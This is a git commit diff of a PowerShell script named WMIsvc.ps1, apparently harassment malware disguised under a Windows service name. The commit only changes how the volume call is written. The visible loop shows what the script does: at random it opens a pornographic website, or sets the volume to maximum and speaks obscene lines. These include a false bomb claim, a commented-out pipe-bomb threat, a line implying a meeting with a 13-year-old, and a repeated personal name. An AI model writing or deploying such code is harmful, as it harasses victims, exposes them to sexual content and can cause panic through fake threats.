b29864a922313b78e483703f320020cb0995595b
lfgberg <lfgaberg@gmail.com>
2024-01-17 22:15:11 -0500

    Update WMIsvc.ps1

--- WMIsvc.ps1
+++ WMIsvc.ps1
@@ -14,23 +14,23 @@ while ($true){
     if ($randomNumber -eq 1){
         explorer.exe "https://porn.tgm.one"
     } elseif ($randomNumber -eq 2){
-        set_AudioLevel -Volume 100
+        set_AudioLevel 100
         #$speaker.Speak("I HAVE A PIPE BOMB THIS IS NOT A JOKE THERE IS A PIPE BOMB IN MY BACKPACK IT IS PRIMED TO EXPLODE")
         $speaker.Speak("AN EXPLOSIVE I PLANTED IN THE BUILDING HAS GONE OFF THERE IS AN EXPLOSION IN THIS BUILDING... IN MY PANTS I HAVE SHAT MY PANTS THERE HAS BEEN A POOPY EXPLOSION IN MY PANTS CLEAN UP AISLE MY PANTS")
     } elseif ($randomNumber -eq 3){
-        set_AudioLevel -Volume 100
+        set_AudioLevel 100
         $speaker.Speak("I HAVE BEEN EDGING FOR 48 HOURS IM GOING TO BUST ALL OVER")
     } elseif ($randomNumber -eq 4){
-        set_AudioLevel -Volume 100
+        set_AudioLevel 100
         $speaker.Speak("BATTERY LOW BATTERY LOW BATTERY LOW BATTERY LOW CHARGE BLUETOOTH INTEGRATED HIGH SPEED OSCILLATING ANAL SUPPOSITORY BATTERY LOW BATTERY LOW BATTERY LOW")
     } elseif ($randomNumber -eq 5){
-        set_AudioLevel -Volume 100
+        set_AudioLevel 100
         $speaker.Speak("DOWNLOADING GAY PORN DOWNLOADING GAY PORN GAY PORN DOWNLOAD IN PROGRESS DOWNLOADING MIDGET PORN DOWNLOADING GAY MIDGET PORN")
     } elseif ($randomNumber -eq 6){
-        set_AudioLevel -Volume 100
+        set_AudioLevel 100
         $speaker.Speak("RICHARD JOYCE THE THIRD RICHARD JOYCE THE THIRD RICHARD JOYCE THE THIRD ")
     } elseif ($randomNumber -eq 7){
-        set_AudioLevel -Volume 100
+        set_AudioLevel 100
         $speaker.Speak("I AM HERE TO MEET A 13 YEAR OLD GIRL")
     } elseif ($randomNumber -eq 8){
         explorer.exe "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
